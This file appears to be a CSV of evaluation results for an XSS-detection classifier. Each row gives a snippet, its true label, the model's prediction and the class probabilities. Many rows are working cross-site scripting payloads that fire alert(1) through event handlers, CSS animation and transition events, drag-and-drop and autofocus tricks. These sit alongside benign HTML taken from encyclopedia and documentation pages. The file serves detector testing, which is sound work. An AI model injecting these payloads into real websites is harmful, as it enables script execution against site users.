payload,true_label,predicted_label,probabilities,inference_time_ms
"	<h3 id=""p-namespaces-label"">Namespaces </h3>",0,0,"{'benign': 0.738, 'malicious': 0.262}",46.29520000000298
"<rb onmousemove=""alert(1)"">test</rb>",1,1,"{'benign': 0.43, 'malicious': 0.57}",43.05659999999989
"<tfoot onmouseover=""alert(1)"">test</tfoot>",1,1,"{'benign': 0.3763, 'malicious': 0.6237}",44.34349999999654
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,1,1,"{'benign': 0.4585, 'malicious': 0.5415}",50.14919999999279
"	 </span> <span class=""reference-text"">",0,0,"{'benign': 0.6641, 'malicious': 0.3359}",39.0562999999986
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",1,1,"{'benign': 0.3377, 'malicious': 0.6623}",45.03319999997757
<svg><em onload=alert(1)></em>,1,1,"{'benign': 0.3937, 'malicious': 0.6063}",41.448300000013205
"<div class=""thumb tright"">",0,0,"{'benign': 0.5144, 'malicious': 0.4856}",37.32800000000225
<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,1,0,"{'benign': 0.5484, 'malicious': 0.4516}",50.29919999998356
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",1,1,"{'benign': 0.27, 'malicious': 0.73}",55.64239999998222
<ul onpointerenter=alert(1)>XSS</ul>,1,1,"{'benign': 0.4353, 'malicious': 0.5647}",43.258500000007416
"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>",1,1,"{'benign': 0.2414, 'malicious': 0.7586}",45.49119999998652
"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",1,1,"{'benign': 0.0944, 'malicious': 0.9056}",56.9945999999959
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",1,1,"{'benign': 0.3211, 'malicious': 0.6789}",62.31839999998101
"<ul><li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge reasoning </a> </li>",0,1,"{'benign': 0.1912, 'malicious': 0.8088}",59.76290000000972
<multicol onpointerleave=alert(1)>XSS</multicol>,1,1,"{'benign': 0.3044, 'malicious': 0.6956}",46.42109999997501
"<param oncontextmenu=""alert(1)"">test</param>",1,1,"{'benign': 0.3071, 'malicious': 0.6929}",43.60420000000431
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,"{'benign': 0.5832, 'malicious': 0.4168}",62.542500000006385
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",1,1,"{'benign': 0.3715, 'malicious': 0.6285}",58.763400000003685
<details id=x tabindex=1 onactivate=alert(1)></details>,1,1,"{'benign': 0.485, 'malicious': 0.515}",44.53480000000809
<svg><blockquote onload=alert(1)></blockquote>,1,0,"{'benign': 0.6088, 'malicious': 0.3912}",50.714499999998
<samp onpointerenter=alert(1)>XSS</samp>,1,1,"{'benign': 0.4561, 'malicious': 0.5439}",45.92259999998305
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_4-234""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_4_234-0"">^ </a> </b> ",0,0,"{'benign': 0.9864, 'malicious': 0.0136}",101.66920000000346
"<svg onmousemove=""alert(1)"">test</svg>",1,1,"{'benign': 0.4896, 'malicious': 0.5104}",54.43130000000451
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1,0,"{'benign': 0.5269, 'malicious': 0.4731}",50.302499999986594
<blockquote onpointerleave=alert(1)>XSS</blockquote>,1,0,"{'benign': 0.5856, 'malicious': 0.4144}",49.0375000000256
	 </span> </h3>,0,0,"{'benign': 0.6896, 'malicious': 0.3104}",39.69220000001883
"<th onmouseleave=""alert(1)"">test</th>",1,1,"{'benign': 0.3887, 'malicious': 0.6113}",39.954000000022916
<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>,1,0,"{'benign': 0.5873, 'malicious': 0.4127}",49.86999999999853
"<source onmousedown=""alert(1)"">test</source>",1,0,"{'benign': 0.651, 'malicious': 0.349}",38.62269999999057
"<li id=""cite_note-Intelligent_agents-179""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Intelligent_agents_179-0"">^ </a> </b> ",0,0,"{'benign': 0.9056, 'malicious': 0.0944}",78.26879999998937
"<html oncopy=""alert(1)"" contenteditable>test</html>",1,0,"{'benign': 0.5903, 'malicious': 0.4097}",45.93330000000151
"<applet onmouseleave=""alert(1)"">test</applet>",1,0,"{'benign': 0.6704, 'malicious': 0.3296}",43.17389999999932
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Neumann, Bernd; M??¶ller, Ralf (January 2008). ""On scene interpretation with description logics"". <i>Image and Vision Computing </i>. <b>26 </b> (1): 82??01. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.imavis.2007.08.013"">10.1016/j.imavis.2007.08.013 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Image+and+Vision+Computing&amp;rft.atitle=On+scene+interpretation+with+description+logics&amp;rft.volume=26&amp;rft.issue=1&amp;rft.pages=82-101&amp;rft.date=2008-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.imavis.2007.08.013&amp;rft.aulast=Neumann&amp;rft.aufirst=Bernd&amp;rft.au=M%C3%B6ller%2C+Ralf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.1105, 'malicious': 0.8895}",416.2828999999988
 </li>,0,0,"{'benign': 0.9319, 'malicious': 0.0681}",35.583300000013196
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1,1,"{'benign': 0.4228, 'malicious': 0.5772}",44.431000000002996
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",34.32789999999386
"<button onmouseup=""alert(1)"">test</button>",1,1,"{'benign': 0.4717, 'malicious': 0.5283}",40.52059999997937
	 </span> </li>,0,0,"{'benign': 0.7253, 'malicious': 0.2747}",36.88159999998675
<textarea onpointerdown=alert(1)>XSS</textarea>,1,1,"{'benign': 0.3975, 'malicious': 0.6025}",43.84880000000635
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>,1,0,"{'benign': 0.538, 'malicious': 0.462}",46.51029999999423
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",1,1,"{'benign': 0.3132, 'malicious': 0.6868}",51.22209999998972
  </script>,0,0,"{'benign': 0.7127, 'malicious': 0.2873}",33.44579999998132
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1,1,"{'benign': 0.442, 'malicious': 0.558}",49.051199999979644
"  <div role=""contentinfo"">",0,0,"{'benign': 0.5611, 'malicious': 0.4389}",35.797400000006974
"  <ul class=""wy-breadcrumbs"">",0,1,"{'benign': 0.395, 'malicious': 0.605}",37.785600000006525
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",35.72859999999878
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",33.72249999998189
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,1,1,"{'benign': 0.4301, 'malicious': 0.5699}",44.286900000003016
<textarea onchange=alert(1)>XSS</textarea>,1,1,"{'benign': 0.4659, 'malicious': 0.5341}",42.66580000000886
"AI research at <a href=""/wiki/University_of_Edinburgh"" title=""University of Edinburgh"">Edinburgh </a> and in France, birth of <a href=""/wiki/Prolog"" title=""Prolog"">Prolog </a>:",0,1,"{'benign': 0.0609, 'malicious': 0.9391}",79.39120000000344
	 </span> </li>,0,0,"{'benign': 0.7253, 'malicious': 0.2747}",36.64510000001542
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",37.58129999999937
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",35.44180000000097
0x42.0x0000066.0x7.0x93/,1,1,"{'benign': 0.3385, 'malicious': 0.6615}",40.466299999991406
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"{'benign': 0.5298, 'malicious': 0.4702}",59.2068999999924
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_security"" title=""Computer security"">Security </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,"{'benign': 0.5098, 'malicious': 0.4902}",118.4035999999935
"    <div class=""rst-footer-buttons"" role=""navigation"" aria-label=""footer navigation"">",0,1,"{'benign': 0.311, 'malicious': 0.689}",50.84909999999354
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",1,0,"{'benign': 0.7078, 'malicious': 0.2922}",47.6056999999912
"Researchers in the 1960s and the 1970s were convinced that symbolic approaches would eventually succeed in creating a machine with <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">artificial general intelligence </a> and considered this the goal of their field.",0,0,"{'benign': 0.5439, 'malicious': 0.4561}",80.30030000000465
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",1,1,"{'benign': 0.3931, 'malicious': 0.6069}",41.58909999998173
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/shell.html"">Scrapy shell</a></li>",0,0,"{'benign': 0.6001, 'malicious': 0.3999}",62.02460000000087
"<legend oncopy=""alert(1)"" contenteditable>test</legend>",1,1,"{'benign': 0.4044, 'malicious': 0.5956}",54.24790000000712
"		<li id=""pt-anonuserpage"">Not logged in </li>",0,1,"{'benign': 0.277, 'malicious': 0.723}",49.21210000000542
<div id='mw-data-after-content'>,0,0,"{'benign': 0.8777, 'malicious': 0.1223}",40.2842000000021
 </li>,0,0,"{'benign': 0.9319, 'malicious': 0.0681}",32.16069999999149
"<li id=""cite_note-6""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-6"">^ </a> </b> ",0,0,"{'benign': 0.8573, 'malicious': 0.1427}",60.885200000001305
"	 </span>. <i>International Journal of Information Technology and Knowledge Management </i>. <b>4 </b> (1): 173??76. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csjournals.com/IJITKM/PDF%204-1/35.Sandeep%20Rajani.pdf"">the original </a> <span class=""cs1-format"">(PDF) ",0,1,"{'benign': 0.1736, 'malicious': 0.8264}",121.68280000000209
"	 </span> <span class=""reference-text"">Igor Aizenberg, Naum N. Aizenberg, Joos P.L. Vandewalle (2000). Multi-Valued and Universal Binary Neurons: Theory, Learning and Applications. Springer Science &amp; Business Media. ",0,0,"{'benign': 0.7924, 'malicious': 0.2076}",88.50160000000074
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1,1,"{'benign': 0.1898, 'malicious': 0.8102}",43.39780000000815
 </li>,0,0,"{'benign': 0.9319, 'malicious': 0.0681}",34.07380000001581
"<li><a href=""/wiki/Open_Letter_on_Artificial_Intelligence"" title=""Open Letter on Artificial Intelligence"">Open Letter on Artificial Intelligence </a> </li>",0,0,"{'benign': 0.7791, 'malicious': 0.2209}",58.98060000001237
"<label onkeydown=""alert(1)"" contenteditable>test</label>",1,1,"{'benign': 0.4582, 'malicious': 0.5418}",44.89900000001512
<time onpointerleave=alert(1)>XSS</time>,1,1,"{'benign': 0.3567, 'malicious': 0.6433}",40.162800000018706
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,1,"{'benign': 0.3606, 'malicious': 0.6394}",75.60929999999644
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"{'benign': 0.5298, 'malicious': 0.4702}",56.19530000001305
"	 </span> <span class=""reference-text"">",0,0,"{'benign': 0.6641, 'malicious': 0.3359}",38.838599999991175
"<li><a href=""/wiki/Probability"" title=""Probability"">Probability </a> </li>",0,0,"{'benign': 0.7605, 'malicious': 0.2395}",40.6456999999989
"			<input type=""submit"" name=""go"" value=""Go"" title=""Go to a page with this exact name if it exists"" id=""searchButton"" class=""searchButton""/>",0,0,"{'benign': 0.7791, 'malicious': 0.2209}",56.494999999983975
		 </h3>,0,0,"{'benign': 0.6895, 'malicious': 0.3105}",33.22000000000003
 </li>,0,0,"{'benign': 0.9319, 'malicious': 0.0681}",32.30270000000246
"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",1,1,"{'benign': 0.0623, 'malicious': 0.9377}",48.927399999996624
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",1,1,"{'benign': 0.0827, 'malicious': 0.9173}",46.10959999999409
"<article onmouseup=""alert(1)"">test</article>",1,1,"{'benign': 0.427, 'malicious': 0.573}",39.290600000015274
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,"{'benign': 0.6621, 'malicious': 0.3379}",49.71960000000308
	 </span> ,0,0,"{'benign': 0.7336, 'malicious': 0.2664}",31.805800000000772
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",1,1,"{'benign': 0.3675, 'malicious': 0.6325}",39.23929999999132
<head>,0,0,"{'benign': 0.9997, 'malicious': 0.0003}",31.594000000012556
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",1,1,"{'benign': 0.44, 'malicious': 0.56}",44.757000000004155
"<style onpaste=""alert(1)"" contenteditable>test</style>",1,1,"{'benign': 0.3762, 'malicious': 0.6238}",39.70830000000092
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",1,1,"{'benign': 0.3533, 'malicious': 0.6467}",44.08890000001975
"	 </span> <span class=""toctext"">Decrease in demand for human labor ",0,0,"{'benign': 0.6293, 'malicious': 0.3707}",45.727499999998145
"	 </span> <span class=""reference-text""><cite class=""citation web"">Rowinski, Dan (15 January 2013). <a rel=""nofollow"" class=""external text"" href=""http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic"">""Virtual Personal Assistants &amp; The Future Of Your Smartphone &#91;Infographic&#93;"" </a>. <i>ReadWrite </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151222083034/http://readwrite.com/2013/01/15/virtual-personal-assistants-the-future-of-your-smartphone-infographic"">Archived </a> from the original on 22 December 2015. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ReadWrite&amp;rft.atitle=Virtual+Personal+Assistants+%26+The+Future+Of+Your+Smartphone+%5BInfographic%5D&amp;rft.date=2013-01-15&amp;rft.au=Rowinski%2C+Dan&amp;rft_id=http%3A%2F%2Freadwrite.com%2F2013%2F01%2F15%2Fvirtual-personal-assistants-the-future-of-your-smartphone-infographic&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.1005, 'malicious': 0.8995}",417.34060000001705
"<tbody ondblclick=""alert(1)"">test</tbody>",1,1,"{'benign': 0.3166, 'malicious': 0.6834}",42.49469999999178
"<output onmousemove=""alert(1)"">test</output>",1,0,"{'benign': 0.5179, 'malicious': 0.4821}",39.49760000000424
"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></footer>",1,1,"{'benign': 0.2575, 'malicious': 0.7425}",60.305700000014895
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,1,1,"{'benign': 0.4081, 'malicious': 0.5919}",46.029800000013665
<col id=x tabindex=1 onactivate=alert(1)></col>,1,1,"{'benign': 0.4682, 'malicious': 0.5318}",44.85829999998714
<head id=x tabindex=1 onfocusin=alert(1)></head>,1,1,"{'benign': 0.4221, 'malicious': 0.5779}",41.97769999998968
<font onpointermove=alert(1)>XSS</font>,1,1,"{'benign': 0.344, 'malicious': 0.656}",47.36610000000496
"<li>Ask a question in the <a class=""reference external"" href=""irc://irc.freenode.net/scrapy"">#scrapy IRC channel</a>,</li>",0,0,"{'benign': 0.889, 'malicious': 0.111}",72.990400000009
<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>,1,1,"{'benign': 0.4294, 'malicious': 0.5706}",47.73589999999217
"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>",1,1,"{'benign': 0.4641, 'malicious': 0.5359}",44.67729999998937
"<ul onmouseout=""alert(1)"">test</ul>",1,1,"{'benign': 0.3468, 'malicious': 0.6532}",41.603100000003224
"<object onmouseup=""alert(1)"">test</object>",1,1,"{'benign': 0.4371, 'malicious': 0.5629}",40.873399999981075
"<object onkeyup=""alert(1)"" contenteditable>test</object>",1,1,"{'benign': 0.4615, 'malicious': 0.5385}",46.70290000001387
"        <script src=""_static/js/hoverxref.js""></script>",0,0,"{'benign': 0.6379, 'malicious': 0.3621}",45.76099999999883
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,1,1,"{'benign': 0.2483, 'malicious': 0.7517}",42.495099999996455
" </p><p>Numerous researchers now use variants of a deep learning recurrent NN called the <a href=""/wiki/Long_short-term_memory"" title=""Long short-term memory"">long short-term memory </a> (LSTM) network published by Hochreiter &amp; Schmidhuber in 1997.<sup id=""cite_ref-lstm_266-0"" class=""reference""><a href=""#cite_note-lstm-266"">&#91;255&#93; </a> </sup> LSTM is often trained by <a href=""/wiki/Connectionist_temporal_classification"" title=""Connectionist temporal classification"">Connectionist Temporal Classification </a> (CTC).<sup id=""cite_ref-graves2006_267-0"" class=""reference""><a href=""#cite_note-graves2006-267"">&#91;256&#93; </a> </sup> At Google, Microsoft and Baidu this approach has revolutionized <a href=""/wiki/Speech_recognition"" title=""Speech recognition"">speech recognition </a>.<sup id=""cite_ref-hannun2014_268-0"" class=""reference""><a href=""#cite_note-hannun2014-268"">&#91;257&#93; </a> </sup><sup id=""cite_ref-sak2014_269-0"" class=""reference""><a href=""#cite_note-sak2014-269"">&#91;258&#93; </a> </sup><sup id=""cite_ref-liwu2015_270-0"" class=""reference""><a href=""#cite_note-liwu2015-270"">&#91;259&#93; </a> </sup> For example, in 2015, Google's speech recognition experienced a dramatic performance jump of 49% through CTC-trained LSTM, which is now available through <a href=""/wiki/Google_Voice"" title=""Google Voice"">Google Voice </a> to billions of smartphone users.<sup id=""cite_ref-sak2015_271-0"" class=""reference""><a href=""#cite_note-sak2015-271"">&#91;260&#93; </a> </sup> Google also used LSTM to improve machine translation,<sup id=""cite_ref-sutskever2014_272-0"" class=""reference""><a href=""#cite_note-sutskever2014-272"">&#91;261&#93; </a> </sup> Language Modeling<sup id=""cite_ref-vinyals2016_273-0"" class=""reference""><a href=""#cite_note-vinyals2016-273"">&#91;262&#93; </a> </sup> and Multilingual Language Processing.<sup id=""cite_ref-gillick2015_274-0"" class=""reference""><a href=""#cite_note-gillick2015-274"">&#91;263&#93; </a> </sup> LSTM combined with CNNs also improved automatic image captioning<sup id=""cite_ref-vinyals2015_275-0"" class=""reference""><a href=""#cite_note-vinyals2015-275"">&#91;264&#93; </a> </sup> and a plethora of other applications.",0,0,"{'benign': 0.877, 'malicious': 0.123}",524.7546000000227
"<li id=""cite_note-Neural_networks-219""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Neural_networks_219-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Neural_networks_219-1""><sup><i><b>b </b> </i> </sup> </a> ",0,0,"{'benign': 0.9777, 'malicious': 0.0223}",207.028600000001
"SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",1,1,"{'benign': 0.2466, 'malicious': 0.7534}",42.894599999982574
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",1,1,"{'benign': 0.4497, 'malicious': 0.5503}",58.78989999999362
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",30.842199999995046
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nobr>",1,1,"{'benign': 0.0908, 'malicious': 0.9092}",101.72339999999735
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",1,1,"{'benign': 0.2773, 'malicious': 0.7227}",43.926099999993085
"	 <div style=""padding:0em 0.25em"">",0,0,"{'benign': 0.5136, 'malicious': 0.4864}",40.61790000000087
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=60"" title=""Edit section: Machine consciousness, sentience and mind"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,"{'benign': 0.092, 'malicious': 0.908}",82.34360000000152
"	 </span> <span class=""toctext"">Art ",0,0,"{'benign': 0.718, 'malicious': 0.282}",38.901600000002645
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1,1,"{'benign': 0.417, 'malicious': 0.583}",41.60039999999299
"	 </span> <span class=""reference-text"">",0,0,"{'benign': 0.6641, 'malicious': 0.3359}",37.3255999999742
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",1,1,"{'benign': 0.0301, 'malicious': 0.9699}",54.62989999998058
"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>",1,1,"{'benign': 0.026, 'malicious': 0.974}",52.54280000002609
<element onpointerdown=alert(1)>XSS</element>,1,1,"{'benign': 0.3963, 'malicious': 0.6037}",43.62390000000005
"<output onclick=""alert(1)"">test</output>",1,0,"{'benign': 0.6126, 'malicious': 0.3874}",40.7470000000103
"<li><a href=""/wiki/Scientific_law"" title=""Scientific law"">Scientific law </a> </li>",0,0,"{'benign': 0.7084, 'malicious': 0.2916}",44.56650000000195
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1,1,"{'benign': 0.3125, 'malicious': 0.6875}",92.08659999998758
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,1,1,"{'benign': 0.4655, 'malicious': 0.5345}",48.88230000000249
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,"{'benign': 0.5832, 'malicious': 0.4168}",65.42290000001572
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,1,1,"{'benign': 0.3089, 'malicious': 0.6911}",51.55220000000327
	 </span> 2016 ,0,0,"{'benign': 0.7037, 'malicious': 0.2963}",37.717799999995805
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Laird, John (2008). ""Extending the Soar cognitive architecture"". <i>Frontiers in Artificial Intelligence and Applications </i>. <b>171 </b>: 224. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.77.2473"">10.1.1.77.2473 </a> ",0,0,"{'benign': 0.7267, 'malicious': 0.2733}",195.05589999999984
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",1,1,"{'benign': 0.2943, 'malicious': 0.7057}",92.03229999999962
"<svg onmouseover=""alert(1)"">test</svg>",1,1,"{'benign': 0.4822, 'malicious': 0.5178}",43.464700000015455
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>",0,0,"{'benign': 0.6094, 'malicious': 0.3906}",53.58259999999859
"<div class=""toctree-wrapper compound"">",0,0,"{'benign': 0.6415, 'malicious': 0.3585}",36.56510000001845
"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>",1,1,"{'benign': 0.1176, 'malicious': 0.8824}",48.11019999999644
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",33.80369999999289
"<h3><span class=""mw-headline"" id=""Cybersecurity"">Cybersecurity ",0,0,"{'benign': 0.7182, 'malicious': 0.2818}",45.67710000000602
                latest,0,0,"{'benign': 0.5569, 'malicious': 0.4431}",41.20520000000738
"<footer ondblclick=""alert(1)"">test</footer>",1,1,"{'benign': 0.3128, 'malicious': 0.6872}",45.44060000000627
"<center onkeyup=""alert(1)"" contenteditable>test</center>",1,1,"{'benign': 0.3556, 'malicious': 0.6444}",46.86460000002057
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",1,1,"{'benign': 0.1, 'malicious': 0.9}",44.96199999999817
"	 </span> <span class=""reference-text""><cite class=""citation book""><a rel=""nofollow"" class=""external text"" href=""https://ec.europa.eu/info/sites/info/files/commission-white-paper-artificial-intelligence-feb2020_en.pdf""><i>White Paper: On Artificial Intelligence - A European approach to excellence and trust </i> </a> <span class=""cs1-format"">(PDF) ",0,0,"{'benign': 0.6114, 'malicious': 0.3886}",118.73099999999681
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.scientificamerican.com/article/what-is-fuzzy-logic-are-t/"">""What is 'fuzzy logic'? Are there computers that are inherently fuzzy and do not apply the usual binary logic?"" </a>. <i>Scientific American </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">5 May ",0,0,"{'benign': 0.9923, 'malicious': 0.0077}",132.0059000000242
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1,1,"{'benign': 0.4108, 'malicious': 0.5892}",44.27090000001499
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",1,1,"{'benign': 0.2974, 'malicious': 0.7026}",68.85479999999689
<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>,1,1,"{'benign': 0.3139, 'malicious': 0.6861}",64.3476999999848
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",1,0,"{'benign': 0.53, 'malicious': 0.47}",124.8094999999978
 </li>,0,0,"{'benign': 0.9319, 'malicious': 0.0681}",38.511700000015026
<time onpointerup=alert(1)>XSS</time>,1,1,"{'benign': 0.3143, 'malicious': 0.6857}",48.3481999999924
	 </span> ,0,0,"{'benign': 0.7336, 'malicious': 0.2664}",38.44720000000734
"<li oncontextmenu=""alert(1)"">test</li>",1,1,"{'benign': 0.4175, 'malicious': 0.5825}",44.04569999999808
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",1,0,"{'benign': 0.5098, 'malicious': 0.4902}",114.7486999999785
 </p>,0,0,"{'benign': 0.971, 'malicious': 0.029}",46.46370000000388
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",1,1,"{'benign': 0.044, 'malicious': 0.956}",78.07339999999385
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,1,1,"{'benign': 0.4212, 'malicious': 0.5788}",46.30390000002649
	 </span>,0,0,"{'benign': 0.8075, 'malicious': 0.1925}",35.567799999995486
"<li><a href=""/wiki/No_free_lunch_in_search_and_optimization"" title=""No free lunch in search and optimization"">No free lunch in search and optimization </a> </li>",0,0,"{'benign': 0.5169, 'malicious': 0.4831}",71.99230000000512
